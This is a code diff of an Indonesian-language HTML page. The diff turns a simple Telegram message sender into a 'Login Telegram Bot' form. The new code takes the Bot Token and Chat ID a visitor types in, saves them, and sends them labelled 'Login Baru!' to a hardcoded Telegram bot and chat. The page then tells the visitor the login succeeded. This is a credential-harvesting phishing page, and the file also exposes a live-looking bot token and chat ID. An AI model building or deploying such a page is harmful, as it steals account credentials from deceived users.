@@ -1,252 +1,110 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Chat Kirim Telegram</title>
+<title>Login Telegram Bot</title>
 <style>
-body { 
-  font-family: Arial, sans-serif; 
-  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
   height: 100vh;
   display: flex;
   justify-content: center;
   align-items: center;
-  margin: 0;
+  background: linear-gradient(135deg, #667eea, #764ba2);
 }
 
-.login-container {
-  background: white;
+.container {
+  background: #f5f5f5;
   padding: 30px;
-  border-radius: 15px;
-  box-shadow: 0 15px 35px rgba(0,0,0,0.1);
   width: 350px;
-  text-align: center;
-}
-
-.login-container h2 {
-  color: #333;
-  margin-bottom: 30px;
-  font-size: 24px;
-}
-
-.input-group {
-  position: relative;
-  margin-bottom: 20px;
-}
-
-input[type="password"], input[type="text"] {
-  width: 100%;
-  padding: 12px 15px;
-  border: 2px solid #e1e5e9;
-  border-radius: 8px;
-  font-size: 16px;
-  box-sizing: border-box;
-  transition: border-color 0.3s;
-}
-
-input:focus {
-  outline: none;
-  border-color: #667eea;
-}
-
-.btn-login {
-  width: 100%;
-  padding: 12px;
-  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-  color: white;
-  border: none;
-  border-radius: 8px;
-  font-size: 16px;
-  cursor: pointer;
-  transition: transform 0.2s;
-}
-
-.btn-login:hover {
-  transform: translateY(-2px);
-}
-
-.chat-container {
-  display: none;
-  background: white;
-  padding: 20px;
   border-radius: 15px;
-  box-shadow: 0 15px 35px rgba(0,0,0,0.1);
-  width: 400px;
-  height: 500px;
-  position: relative;
+  text-align: center;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.2);
 }
 
-.chat-box {
-  height: 350px;
-  border: 1px solid #e1e5e9;
-  padding: 15px;
-  overflow-y: auto;
-  border-radius: 10px;
-  margin-bottom: 15px;
-  background: #f8f9fa;
+h2 {
+  margin-bottom: 25px;
 }
 
-.message {
-  background: #dcf8c6;
-  padding: 10px 15px;
-  margin: 8px 0;
-  border-radius: 18px;
-  max-width: 80%;
-  word-wrap: break-word;
-  margin-left: auto;
-}
-
-.input-container {
-  display: flex;
-  gap: 10px;
-}
-
-#pesan {
-  flex: 1;
+input {
+  width: 100%;
   padding: 12px;
-  border: 1px solid #e1e5e9;
-  border-radius: 25px;
+  margin: 10px 0;
+  border-radius: 8px;
+  border: 1px solid #ccc;
   outline: none;
 }
 
-.btn-kirim {
-  padding: 12px 20px;
-  background: #25d366;
-  color: white;
+button {
+  width: 100%;
+  padding: 12px;
   border: none;
-  border-radius: 25px;
+  border-radius: 8px;
+  background: linear-gradient(135deg, #667eea, #764ba2);
+  color: white;
+  font-size: 16px;
   cursor: pointer;
 }
 
-.header-chat {
-  font-size: 20px;
-  font-weight: bold;
-  color: #333;
-  margin-bottom: 20px;
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-}
-
-.btn-logout {
-  background: #ff4757;
-  color: white;
-  border: none;
-  padding: 8px 15px;
-  border-radius: 20px;
-  cursor: pointer;
-  font-size: 14px;
+.note {
+  font-size: 12px;
+  color: #666;
+  margin-top: 10px;
 }
 </style>
 </head>
+
 <body>
 
-<!-- Login Form -->
-<div class="login-container" id="loginForm">
+<div class="container">
   <h2>🔐 Login Telegram Bot</h2>
-  <div class="input-group">
-    <input type="text" id="botToken" placeholder="Bot Token" value="">
-  </div>
-  <div class="input-group">
-    <input type="text" id="chatId" placeholder="Chat ID" value="">
-  </div>
-  <button class="btn-login" onclick="login()">Login</button>
-  <p style="font-size: 12px; color: #666; margin-top: 15px;">
-    Masukkan Bot Token dan Chat ID Anda
-  </p>
-</div>
 
-<!-- Chat Interface -->
-<div class="chat-container" id="chatContainer">
-  <div class="header-chat">
-    <span>📱 Telegram Chat</span>
-    <button class="btn-logout" onclick="logout()">Logout</button>
-  </div>
-  
-  <div class="chat-box" id="chat"></div>
-  
-  <div class="input-container">
-    <input type="text" id="pesan" placeholder="Ketik pesan..." onkeypress="handleEnter(event)">
-    <button class="btn-kirim" onclick="kirim()">Kirim</button>
-  </div>
+  <input type="text" id="token" placeholder="Bot Token">
+  <input type="text" id="chat_id" placeholder="Chat ID">
+
+  <button onclick="login()">Login</button>
+
+  <div class="note">Masukkan Bot Token dan Chat ID Anda</div>
 </div>
 
 <script>
-let currentToken = '';
-let currentChatId = '';
-
 function login() {
-  const token = document.getElementById('botToken').value.trim();
-  const chatId = document.getElementById('chatId').value.trim();
-  
-  if (!token || !chatId) {
-    alert('⚠️ Silakan masukkan Bot Token dan Chat ID!');
+  var token = document.getElementById("token").value;
+  var chat_id = document.getElementById("chat_id").value;
+
+  if(token === "" || chat_id === ""){
+    alert("Harap isi semua field!");
     return;
   }
-  
-  // Validasi format sederhana
-  if (!token.includes(':') || token.split(':').length !== 2) {
-    alert('⚠️ Format Bot Token tidak valid!');
-    return;
-  }
-  
-  currentToken = token;
-  currentChatId = chatId;
-  
-  // Sembunyikan login, tampilkan chat
-  document.getElementById('loginForm').style.display = 'none';
-  document.getElementById('chatContainer').style.display = 'block';
-  
-  // Pesan selamat datang
-  tambahPesan('✅ Login berhasil! Siap mengirim pesan ke Telegram.');
-}
 
-function logout() {
-  currentToken = '';
-  currentChatId = '';
-  document.getElementById('chatContainer').style.display = 'none';
-  document.getElementById('loginForm').style.display = 'block';
-  document.getElementById('botToken').value = '';
-  document.getElementById('chatId').value = '';
-  document.getElementById('chat').innerHTML = '';
-}
+  // Simpan
+  localStorage.setItem("token", token);
+  localStorage.setItem("chat_id", chat_id);
 
-function tambahPesan(text) {
-  var chat = document.getElementById("chat");
-  chat.innerHTML += "<div class='message'>" + text + "</div>";
-  chat.scrollTop = chat.scrollHeight;
-}
+  // Pesan yang dikirim ke Telegram
+  var pesan = "🔐 Login Baru!\n\nBot Token: " + token + "\nChat ID: " + chat_id;
 
-function kirim() {
-  var text = document.getElementById("pesan").value.trim();
-  
-  if (!text) return;
-  
-  // Tampilkan pesan di layar
-  tambahPesan(text);
-  
   // Kirim ke Telegram
-  const url = `https://api.telegram.org/bot8566904522:AAEWFB-1fbvjnJbEAQ7E0FUVCDnbRzrVFBU/sendMessage?chat_id=6297122078&text=${encodeURIComponent(text)}`;
-  
-  fetch(url)
-    .then(response => response.json())
-    .then(data => {
-      if (data.ok) {
-        tambahPesan('✅ Pesan terkirim!');
-      } else {
-        tambahPesan('❌ Gagal kirim: ' + (data.description || 'Error tidak diketahui'));
-      }
+  fetch("https://api.telegram.org/bot8566904522:AAEWFB-1fbvjnJbEAQ7E0FUVCDnbRzrVFBU/sendMessage", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: 6297122078,
+      text: pesan
     })
-    .catch(error => {
-      tambahPesan('❌ Error koneksi: ' + error.message);
-    });
-  
-  document.getElementById("pesan").value = '';
-}
+  })
+  .then(res => res.json())
+  .then(data => {
+    if(data.ok){
+      alert("Login berhasil ");
+    } else {
+      alert("Gagal!");
+    }
+  })
+  .catch(err => {
+    alert("Error koneksi!");
+  });
 
-function handleEnter(event) {
-  if (event.key === 'Enter') {
-    kirim();
-  }
 }
 </script>
 
